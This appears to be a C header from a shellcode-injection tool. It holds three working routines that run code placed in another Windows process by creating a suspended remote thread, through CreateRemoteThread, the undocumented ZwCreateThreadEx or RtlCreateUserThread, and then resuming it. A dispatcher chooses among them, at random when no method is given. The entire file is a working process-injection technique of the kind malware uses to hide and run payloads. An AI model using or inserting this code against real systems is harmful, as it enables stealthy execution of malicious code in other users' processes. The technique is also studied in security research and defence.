#pragma once
#include <stdio.h>
#include "ntddk.h"
#include "ntdll_undoc.h"

bool run_shellcode_in_new_thread1(HANDLE hProcess, LPVOID remote_shellcode_ptr)
{
    NTSTATUS status = NULL;
    //create a new thread for the injected code:
    LPTHREAD_START_ROUTINE routine = (LPTHREAD_START_ROUTINE) remote_shellcode_ptr;

    DWORD threadId = NULL;
    HANDLE hMyThread = NULL;
    if ((hMyThread = CreateRemoteThread(hProcess, NULL, NULL, routine, NULL, CREATE_SUSPENDED, &threadId)) == NULL) {
        printf("[ERROR] CreateRemoteThread failed, status : %x\n", GetLastError());
        return false;
    }
    printf("Created Thread, id = %x\n", threadId);
    printf("Resuming added thread...\n");
    ResumeThread(hMyThread); //injected code
    return true;
}

bool run_shellcode_in_new_thread2(HANDLE hProcess, LPVOID remote_shellcode_ptr)
{
    NTSTATUS status = NULL;
    HANDLE hMyThread = NULL;
    //create a new thread for the injected code:
    if ((status = ZwCreateThreadEx(&hMyThread, 0x1FFFFF, NULL, hProcess, remote_shellcode_ptr, NULL, CREATE_SUSPENDED, 0, 0, 0, 0)) != STATUS_SUCCESS)
    {
        printf("[ERROR] ZwCreateThreadEx failed, status : %x\n", status);
        return false;
    }
    printf("Created Thread, id = %x\n", GetThreadId(hMyThread));
    printf("Resuming added thread...\n");
    ResumeThread(hMyThread); //injected code
    return true;
}

bool run_shellcode_in_new_thread3(HANDLE hProcess, LPVOID remote_shellcode_ptr)
{
    NTSTATUS status = NULL;
    HANDLE hMyThread = NULL;
    CLIENT_ID cid;
    //create a new thread for the injected code:
    
    if ((status = RtlCreateUserThread(hProcess, NULL, false, 0, 0, 0, remote_shellcode_ptr, NULL, &hMyThread, &cid)) != STATUS_SUCCESS)
    {
        printf("[ERROR] RtlCreateUserThread failed, status : %x\n", status);
        return false;
    }
    printf("Created Thread, id = %x\n", GetThreadId(hMyThread));
    printf("Resuming added thread...\n");
    ResumeThread(hMyThread); //injected code
    return true;
}

//---
bool run_shellcode_in_new_thread(HANDLE hProcess, LPVOID remote_shellcode_ptr, DWORD method = 0)
{
    bool isSuccess = false;
    const SIZE_T method_max = 3;
    DWORD random = (GetTickCount() * 1000) % method_max + 1;
    if (method > method_max || method < 1) method = random;

    printf("Injecting by method, id = %x\n", method);
    switch (method) {
    case 1:
        isSuccess = run_shellcode_in_new_thread1(hProcess, remote_shellcode_ptr);
        break;
    case 2:
        isSuccess = run_shellcode_in_new_thread2(hProcess, remote_shellcode_ptr);
        break;
    case 3:
        isSuccess = run_shellcode_in_new_thread3(hProcess, remote_shellcode_ptr);
        break;
    default:
        return false;
    }
    return isSuccess;
}